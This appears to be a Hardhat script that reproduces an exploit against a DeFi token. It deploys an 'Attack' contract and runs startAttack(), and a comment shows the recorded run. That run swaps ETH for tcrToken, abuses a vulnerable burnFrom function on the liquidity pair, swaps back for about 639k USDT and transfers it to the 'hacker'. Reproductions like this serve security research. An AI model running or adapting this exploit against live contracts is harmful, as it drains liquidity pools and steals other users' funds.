// @ts-ignore
import { ethers } from "hardhat";
/*
const DAI = new ethers.Contract(DAI_ADDRESS, ERC20ABI, provider);
DAIBalance = await DAI.balanceOf(owner.address);
*/
async function main() {
    let Alice, AttackDeployer;
    [Alice, AttackDeployer] = await ethers.getSigners();
    const initAmount = ethers.utils.parseEther("0.04");
    const Attack = await ethers.getContractFactory("Attack", AttackDeployer);
    const attack = await Attack.deploy({ value: initAmount });
    await attack.deployed();
    console.log("attack with 0.04 ETH deployed to:", attack.address);

    // const ethBalance = await ethers.provider.getBalance(Alice.address);
    // console.log("ethBalance:", ethers.utils.formatEther(ethBalance));
    const USDTAddr = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
    const ERC20ABI = require('/Users/houzi/home/Soliditycode/hardhat_solidity/artifacts/contracts/TetherToken.sol/TetherToken.json');
    const provider = ethers.provider;
    const USDT = new ethers.Contract(USDTAddr, ERC20ABI.abi, provider);
    // //eth 余额
    // //owner balance contracts/Attack.sol:IERC20
    await attack.startAttack();
    //USDT 精度6位
    console.log("AttackDeployer USDT balance:", await USDT.balanceOf(AttackDeployer.address));
    //console.log("AttackDeployer USDT balance:", ethers.utils.formatEther(await USDT.balanceOf(AttackDeployer.address)));
}
//run result
/**
 * attack with 0.04 ETH deployed to: 0xfbAb4aa40C202E4e80390171E82379824f7372dd
 1.swap eth to tcrToken. 40000000000000000 ETH swap to 10114462474 tcrToken.
 At begining, Pair Contract has 58017169442472 tcrToken:
 2. Call the Vulnerable burnFrom function.
 3. Swap tcr for USDT.
 10114462474 tcr swap to 639222253258 USDT
 4. Transfer 639222253258 USDT to hacker.
 AttackDeployer USDT balance: BigNumber { value: "639222253258" }
 */


main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
